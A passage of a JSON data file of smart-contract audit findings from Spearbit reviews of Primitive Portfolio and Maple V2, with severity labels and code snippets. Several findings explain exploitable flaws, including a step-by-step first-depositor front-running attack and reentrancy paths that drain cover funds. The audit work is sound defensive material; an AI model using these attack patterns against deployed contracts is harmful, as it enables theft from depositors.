        "body": "The AssemblyLib.scaleFromWadUpSigned and AssemblyLib.scaleFromWadDownSigned both work on int256s and therefore also on negative integers. However, the rounding is wrong for these. Rounding down should mean rounding towards negative infinity, and rounding up should mean rounding towards positive infinity. The scaleFromWadDownSigned only performs a truncations, rounding negative integers towards zero. This function is used in checkInvariant to ensure the new invariant is not less than the new invariant in a swap: int256 liveInvariantWad = invariant.scaleFromWadDownSigned(pools[poolId].pair.decimalsQuote); int256 nextInvariantWad = nextInvariant.scaleFromWadDownSigned( pools[poolId].pair.decimalsQuote ); nextInvariantWad >= liveInvariantWad It can happen for quote tokens with fewer decimals, for example, 6 with USDC, that liveInvariantWad was rounded from a positive 0.9999e12 value to zero. And nextInvariantWad was rounded from a negative value of -0.9999e12 to zero. The check passes even though the invariant is violated by almost 2 quote token units.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LPs can lose fees if fee growth accumulator overflows their checkpoint",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Fees (that are not reinvested in the pool) are currently tracked through an accumulator value pool.feeGrowthGlobalAsset and pool.feeGrowthGlobalQuote, computed as asset or quote per liquidity. Each user providing liquidity has a checkpoint of these values from their last sync (claim). When syncing new fees, the distance from the current value to the users checkpoint is computed and multiplied by their liquidity. The accumu- lator values are deliberately allowed to overflow as only the distance matters. However, if an LP does not sync its fees and the accumulator grows, overflows, and grows larger than their last checkpoint, the LP loses all fees. Example:  User allocates at pool.feeGrowthGlobalAsset = 1000e36  pool.feeGrowthGlobalAsset grows and overflows to 0. differenceAsset is still accurate.  pool.feeGrowthGlobalAsset grows more and is now at 1000e36 again. differenceAsset will be zero. If the user only claims their fees now, theyll earn 0 fees.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unnecessary left shift in encodePoolId",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The encodePoolId performs a left shift of 0. This is a noop.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_syncPool performs unnecessary pool state updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The _syncPool function is only called during a swap. During a swap the liquidity never changes and the pools last timestamp has already been updated in _beforeSwapEffects.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Portfolio.sol gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Throughout the contract weve identified a number of minor gas optimizations that can be performed. Weve gathered them into one issue to keep the issue number as small as possible.  L750 The msg.value > 0 check is done also in the __wrapEther__ call  L262 The following substitutions can be optimized in case assets are 0 by moving each instruction within the ifs on lines 256-266 pos.tokensOwedAsset -= claimedAssets.safeCastTo128(); pos.tokensOwedQuote -= claimedQuotes.safeCastTo128();  L376 Consider using the pool object (if it remains as a storage object) instead of pools[args.poolId]  L444:L445 The following two instructions can be grouped into one. output = args.output; output = output.scaleToWad(...  L436:L443 The internalBalance variable can be discarded due to the fact that it is used only within the input assignment. uint256 internalBalance = getBalance( msg.sender, _state.sell ? pool.pair.tokenAsset : pool.pair.tokenQuote ); input = args.useMax == 1 ? internalBalance : args.input; input = input.scaleToWad( _state.sell ? pool.pair.decimalsAsset : pool.pair.decimalsQuote );  L808 Assuming that the swap instruction will be one of the most used instructions, might be worth moving it as first if condition to save gas.  L409 The if (args.input == 0) revert ZeroInput(); can be removed as it will result in iteration.input being zero and reverting on L457.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Incomplete NatSpec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Throughout the IPortofolio.sol interface, various NatSpec comments are missing or incomplete",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate Comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "These comments are inaccurate. [1] The hex value on this line translates to v0.1.0-beta instead of v1.0.0-beta. [2] computeTau returns either the time until pool maturity, or zero if the pool is already expired. [3] These comments do not properly account for the two byte offset from the start of the array (in L94, only in the endpoint of the slice).",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check for priorityFee should have its own custom error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The check for invalid priorityFee within the checkParameters function uses the same custom error as the one for fee. This could lead to confusion in the error output.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unclear @dev comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "This comment is misleading. It implies that cache is used to \"check\" state while it in fact changes it.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused custom error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "Unused error error AlreadySettled();",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use named constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The decodeSwap function compares a value against the constant 6. This value indicates the SWAP_- ASSET constant. sellAsset := eq(6, and(0x0F, byte(0, value)))",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "scaleFromWadUp and scaleFromWadUpSigned can underflow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The scaleFromWadUp and scaleFromWadUpSigned will underflow if the amountWad parameter is 0 because they perform an unchecked subtraction on it: outputDec := add(div(sub(amountWad, 1), factor), 1) // ((a-1) / b) + 1",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "AssemblyLib.pack does not clear lowers upper bits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The pack function packs the 4 lower bits of two bytes into a single byte. If the lower parameter has dirty upper bits, they will be mixed with the higher byte and be set on the final return value.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "AssemblyLib.toBytes8/16 functions assumes a max raw length of 16",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The toBytes16 function only works if the length of the bytes raw parameter is at most 16 because of the unchcked subtraction: let shift := mul(sub(16, mload(raw)), 8) The same issue exists for the toBytes8 function.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "PortfolioLib.maturity returns wrong value for perpertual pools",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "A pool can be a perpetual pool that is modeled as a pool with a time to maturity always set to 1 year in the computeTau. However, the maturity function does not return this same maturity. This currently isnt a problem as maturity is only called from computeTau in case it is not a perpetual pool.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "_createPool has incomplete NatSpec and event args",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The _createPool function contains incomplete NatSpec specifications. Furthermore, the event emitted by this function can be improved by adding more arguments.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "_liquidityPolicy is cast to a uint8 but it should be a uint16",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "During _createPool the pool curve parameters are set. One of them is the jit parameter which is a uint16. It can be assigned the default value of _liquidityPolicy but it is cast to a uint8. If the _liquidityPolicy constant is ever changed to a value greater than type(uint8).max a wrong jit value will be assigned.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Update _feeSavingEffects documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The _feeSavingEffects documentation states: @return bool True if the fees were saved in positions owed tokens instead of re-invested.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document checkInvariant and resolve confusing naming",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The checkInvariant functions return values are undocumented and the used variables names are confusing.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Token amounts are in wrong decimals if useMax parameter is used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The allocate and swap functions have a useMax parameter that sets the token amounts to be used to the net balance of the contract. This net balance is the return value of a getNetBalance call, which is in token decimals. The code that follows (getPoolMaxLiquidity for allocate, iteration.input for swap) expects these amounts to be in WAD units. Using this parameter with tokens that don't have 18 decimals does not work correctly. The actual tokens used will be far lower than the expected amount to be used which will lead to user loss as the tokens remain in the contract after the action.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: High Risk"
        ]
    },
    {
        "title": "getAmountOut underestimates outputs leading to losses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "When computing the output, the getAmountOut performs a bisection. However, this bisection returns any root of the function, not the lowest root. As the invariant is far from being strictly monotonic in R_x, it contains many neighbouring roots (> 2e9 in the example) and it's important to return the lowest root, corresponding to the lowest nextDependent, i.e., it leads to a larger output amount amountOut = prevDependent - nextDependent. Users using this function to estimate their outputs can incur significant losses.  Example: Calling getAmountOut(poolId, false, 1, 0, address(0)) with the pool configuration in the example will return amtOut = 123695775, whereas the real max possible amtOut for that swap is 33x higher at 4089008108. The core issue is that invariant is not strictly monotonic, invariant(R_x, R_y) = invariant(R_x + 2_852_- 050_358, R_y), there are many neighbouring roots for the pool configuration: function test_eval() public { uint128 R_y = 56075575; uint128 R_x = 477959654248878758; uint128 stk = 117322822; uint128 vol = 406600000000000000; uint128 tau = 2332800; int256 prev = Invariant.invariant({R_y: R_y, R_x: R_x, stk: stk, vol: vol, tau: tau}); // this is the actual dependent that still satisfies the invariant R_x -= 2_852_050_358; int256 post = Invariant.invariant({R_y: R_y, R_x: R_x, stk: stk, vol: vol, tau: tau}); 25 console2.log(\"prev: %s\", prev); console2.log(\"post: %s\", post); assertEq(post, prev); assertEq(post, 0); }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getAmountOut Calculates an Output Value That Sets the Invariant to Zero, Instead of Preserving Its Value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The swap function enforces that the pool's invariant value does not decrease; however, the getA- mountOut function computes an expected swap output based on setting the pool's invariant to zero, which is only equivalent if the initial value of the invariant was already zero--which will generally not be the case as fees accrue and time passes. This is because in computeSwapStep (invoked by getAmountOut [1]), the func- tion (optimizeDependentReserve) passed [2] to the bisection algorithm for root finding returns just the invariant evaluated on the current arguments [3] instead of the difference between the evaluated and original invariant. As a consequence, getAmountOut will return an inaccurate result when the starting value of the invariant is non-zero, leading to either disadvantageous swaps or swaps that revert, depending on whether the current pool invariant value is less than or greater than zero.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getAmountOut Does Not Adjust The Pool's Reserve Values Based on the liquidityDelta Parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The liquidityDelta parameter allows a caller to adjust the liquidity in a pool before simulating a swap. However, corresponding adjustments are not made to the per-pool reserves, virtualX and virtualY. This makes the reserve-to-liquidity ratios used in the calculations incorrect, leading to inaccurate results (or potentially reverts if the invalid values fall outside of allowed ranges). Use of the inaccurate swap outputs could lead either to swaps at bad prices or swaps that revert unexpectedly.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Bisection always uses max iterations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The current bisection algorithm chooses the mid point as root = (lower + upper) / 2; and the bisection terminates if either upper - lower < 0 or maxIterations is reached. Given upper >= lower throughout the code, it's easy to see that upper - lower < 0 can never be satisfied. The bisection will always use the max iterations. However, even with an epsilon of 1 it can happen that the mid point root is the same as the lower bound if upper = lower + 1. The if (output * lowerOutput < 0) condition will never be satisfied and the else case will always run, setting the lower bound to itself. The bisection will keep iterating with the same lower and upper bounds until max iterations are reached.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential reentrancy in claimFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The contract performs all transfers in the _settlement function and therefore _settlement can call- back to the user for reentrant tokens. To avoid reentrancy issues the _preLock() modifier implements a reentrancy check, but only if the called action is not happening during a multicall execution: function _preLock() private { // Reverts if the lock was already set and the current call is not a multicall. if (_locked != 1 && !_currentMulticall) { revert InvalidReentrancy(); } _locked = 2; } Therefore, multicalls are not protected against reentrancy and _settlement should never be executed, only once at the end of the original multicall function. However, the claimFee function can be called through a multicall by the protocol owner and it calls _settlement even if the execution is part of a multicall.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bisection can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The Bisection algorithm tries to find a root of the monotonic function. Evaluating the expensive invariant function at the lower point on each iteration can be avoided by caching the output function value whenever a new lower bound is set.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pool existence check in swap should happen earlier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The swap function makes use of the pool pair's tokens to scale the input decimals before it checks if the pool even exists.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "Pool creation in test uses wrong duration and volatility",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review.pdf",
        "body": "The second path with pairId != 0 in HelperConfigsLib's pool creation calls the createPool method with the volatility and duration parameters swapped, leading to wrong pool creations used in tests that use this path.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Informational"
        ]
    },
    {
        "title": "First pool depositor can be front-run and have part of their deposit stolen",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The first deposit with a totalSupply of zero shares will mint shares equal to the deposited amount. This makes it possible to deposit the smallest unit of a token and profit off a rounding issue in the computation for the minted shares of the next depositor: (shares_ * totalAssets()) / totalSupply_ Example:  The first depositor (victim) wants to deposit 2M USDC (2e12) and submits the transaction.  The attacker front runs the victim's transaction by calling deposit(1) to get 1 share. They then transfer 1M USDC (1e12) to the contract, such that totalAssets = 1e12 + 1, totalSupply = 1.  When the victim's transaction is mined, they receive 2e12 / (1e12 + 1) * totalSupply = 1 shares (rounded down from 1.9999...).  The attacker withdraws their 1 share and gets 3M USDC * 1 / 2 = 1.5M USDC, making a 0.5M profit. During the migration, an _initialSupply of shares to be airdropped are already minted at initialization and are not affected by this attack.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Users depositing to a pool with unrealized losses will take on the losses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The pool share price used for deposits is always the totalAssets() / totalSupply, however the pool share price when redeeming is totalAssets() - unrealizedLosses() / totalSupply. The unrealized- Losses value is increased by loan impairments (LM.impairLoan) or when starting triggering a default with a liq- uidation (LM.triggerDefault). The totalAssets are only reduced by this value when the loss is realized in LM.removeLoanImpairment or LM.finishCollateralLiquidation. This leads to a time window where deposits use a much higher share price than current redemptions and future deposits. Users depositing to the pool during this time window are almost guaranteed to make losses when they In the worst case, a Pool.deposit might even be (accidentally) front-run by a loan impairment or are realized. liquidation.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "TransitionLoanManager.add does not account for accrued interest since last call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The TransitionLoanManager.add advances the domain start but the accrued interest since the last domain start is not accounted for. If add is called several times, the accounting will be wrong. It therefore wrongly tracks the _accountedInterest variable.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unaccounted collateral is mishandled in triggerDefault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The control flow of triggerDefault is partially determined by the value of MapleLoanLike(loan_- ).collateral() == 0. The code later assumes there are 0 collateral tokens in the loan if this value is true, which is incorrect in the case of unaccounted collateral tokens. In non-liquidating repossessions, this causes an overes- timation of the number of fundsAsset tokens repossessed, leading to a revert in the _disburseLiquidationFunds function. Anyone can trigger this revert by manually transferring 1 Wei of collateralAsset to the loan itself. In liq- uidating repossessions, a similar issue causes the code to call the liquidator's setCollateralRemaining function with only accounted collateral, meaning unaccounted collateral will be unused/stuck in the liquidator.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Initial cycle time is wrong when queuing several config updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The initial cycle time will be wrong if there's already an upcoming config change that changes the cycle duration. Example: currentCycleId: 100 config[0] = currentConfig = {initialCycleId: 1, cycleDuration = 1 days} config[1] = {initialCycleId: 101, cycleDuration = 7 days} Now, scheduling will create a config with initialCycleId: 103 and initialCycleTime = now + 3 * 1 days, but the cycle durations for cycles (100, 101, 102) are 1 days + 7 days + 7 days.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Users cannot resubmit a withdrawal request as per the wiki",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "As per Maple's wiki: pool-v2::PoolManager.sol#371-L382, withdrawal-  Refresh: The withdrawal request can be resubmitted with the same amount of shares by calling pool.requestRedeem(0). However, the current implementation prevents Pool.requestRedeem() from being called where the shares_ pa- rameter is zero.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Accrued interest may be calculated on an overstated payment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The checkTotalAssets() function is a useful helper that may be used to make business decisions in the protocol. However, if there is a late loan payment, the total interest is calculated on an incorrect payment interval, causing the accrued interest to be overstated. It is also important to note that late interest will also be excluded from the total interest calculation.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "No deadline when liquidating a borrower's collateral",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "A loan's collateral is liquidated in the event of a late payment or if the pool delegate impairs a loan If the loan contains any amount of collateral (assuming it is different to the due to insolvency by the borrower. funds' asset), the liquidation process will attempt to sell the collateral at a discounted amount. Because a liquidation is considered active as long as there is remaining collateral in the liquidator contract, a user can knowingly liquidate all but 1 wei of collateral. As there is no incentive for others to liquidate this dust amount, it is up to the loan manager to incur the cost and responsibility of liquidating this amount before they can successfully call LoanManager.finishCollateralLiquidation().",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Loan impairments can be unavoidably unfair for borrowers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "When a pool delegate impairs a loan, the loan's _nextPaymentDueDate will be set to the min of If the pool delegate later decides to remove the im- block.timestamp and the current _nextPaymentDueDate. pairment, the original _nextPaymentDueDate is restored to its correct value. The borrower can also remove an impairment themselves by making a payment. In this case, the _nextPaymentDueDate is not restored, which is always worse for the borrower. This can be unfair since the borrower would have to pay late interest on a loan that was never actually late (according to the original payment due date). Another related consequence is that a borrower can be liquidated before the original payment due date even passes (this is possible as long as the loan is impaired more than gracePeriod seconds away from the original due date).",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "withdrawCover() vulnerable to reentrancy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "withdrawCover() allows for reentrancy and could be abused to withdraw below the minimum cover amount and avoid having to cover protocol insolvency through a bad liquidation or loan default. The moveFunds() function could transfer the asset amount to the recipient specified by the pool delegate. Some In this case, the pool delegate could reenter the tokens allow for callbacks before the actual transfer is made. withdrawCover() function and bypass the balance check as it is made before tokens are actually transferred. This can be repeated to empty out required cover balance from the contract. It is noted that the PoolDelegateCover contract is a protocol controlled contract, hence the low severity.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bad parameter encoding and deployment when using wrong initializers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The initializers used to encode the arguments, when deploying a new pool in PoolDeployer, might not be the initializers that the proxy factory will use for the default version and might lead to bad parameter encoding & deployments if a wrong initializer is passed.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Event LoanClosed might be emitted with the wrong value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "In function closeLoan function, the fees are got by the getClosingPaymentBreakdown function and it is not adding refinances fees after in code are paid all fee by payServiceFees which may include refinances fees. The event LoanClose might be emitted with the wrong fee value.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bug in makePayment() reverts when called with small amounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "When makePayment() is called with an amount which is less than the fees payable, then the trans- action will always revert, even if there is an adequate amount of drawable funds. The revert happens due to an underflow in getUnaccountedAmount() because the token balance is decremented on the previous line without updating drawable funds.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Pool.previewWithdraw always reverts but Pool.withdraw can succeed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The Pool.previewWithdraw => PM. previewWithdraw => WM.previewWithdraw function call se- quence always reverts in the WithdrawalManager. However, the Pool.withdraw function can succeed. This behavior might be unexpected, especially, as integrators call previewWithdraw before doing the actual withdraw call.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Setting a new WithdrawalManager locks funds in old one",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The WithdrawalManager only accepts calls from a PoolManager. When setting a new withdrawal manager with PoolManager.setWithdrawalManager, the old one cannot be accessed anymore. Any user shares locked for withdrawal in the old one are stuck.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use whenProtocolNotPaused on migrate() instead of upgrade() for more complete protection",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "whenProtocolNotPaused is added to migrate() for the Liquidator, MapleLoan, and Withdrawal- Manager contracts in order to protect the protocol by preventing it from upgrading while the protocol is paused. However, this protection happens only during upgrade, and not during instantiation.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing post-migration check in PoolManager.sol could result in lost funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The protocol employs an upgradeable/migrateable system that includes upgradeable initializers for factory created contracts. For the most part, a storage value that was left uninitialized due to an erroneous initializer would not be affect protocol funds. For example forgetting to initialize _locked would cause all nonReentrant functions to revert, but no funds lost. However, if the poolDelegateCover address were unset and depositCover() were called, the funds would be lost as there is no to != address(0) check in transferFrom.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Globals.poolDelegates[delegate_].ownedPoolManager mapping can be overwritten",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The Globals.poolDelegates[delegate_].ownedPoolManager keeps track of a single pool manager for a pool delegate. It can happen that the same pool delegate is registered for a second pool manager and the mapping is overwritten, by calling PM.acceptPendingPoolDelegate -> Globals.transferOwnedPoolManager or Globals.activatePoolManager.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Pool withdrawals can be kept low by non-redeeming users",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "In the current pool design, users request to exit the pool and are scheduled for a withdrawal window in the withdrawal manager. If the pool does not have enough liquidity, their share on the available pool liquidity is proportionate to the total shares of all users who requested to withdraw in that withdrawal window. It's possible for griefers to keep the withdrawals artificially low by requesting a withdrawal but not actually withdraw- ing during the withdrawal window. These griefers are not penalized but their behavior leads to worse withdrawal amounts for every other honest user.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_getCollateralRequiredFor should round up",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The _getCollateralRequiredFor rounds down the collateral that is required from the borrower. This benefits the borrower.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use the cached variable in makePayment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The claim function is called using _nextPaymentDueDate instead of nextPaymentDueDate_",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "No need to explicitly initialize variables with default values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "By default a value of a variable is set to 0 for uint, false for bool, address(0) for address. . . Explicitly initializing/setting it with its default value wastes gas.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache calculation in getExpectedAmount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The decimal precision calculation is used twice in the getExpectedAmount function, if you cache into a new variable would save some gas.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "For-Loop Optmization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The for-loop can be optimized in 4 ways: 1. Removing initialization of loop counter if the value is 0 by default. 2. Caching array length outside the loop. 3. Prefix increment (++i) instead of postfix increment (i++). 4. Unchecked increment. - for (uint256 i_ = 0; i_ < loans_.length; i_++) { + uint256 length = loans_.length; + for (uint256 i_; i_ < length; ) { ... + unchecked { ++i; } }",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pool._divRoundUp can be more efficient",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The gas cost of Pool._divRoundUp can be reduced in the context that it's used in.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Liquidator uses different reentrancy guards than rest of codebase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "All other reentrancy guards of the codebase use values 1/2 instead of 0/1 to indicate NOT_- LOCKED/LOCKED.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use block.timestamp instead of domainStart in removeLoanImpairment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The removeLoanImpairment function adds back all interest from the payment's start date to domain- Start. The _advanceGlobalPaymentAccounting sets domainStart to block.timestamp.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "setTimelockWindows checks isGovernor multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The Globals.setTimelockWindows function calls setTimelockWindow in a loop and each time set- TimelockWindow's isGovernor is checked.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
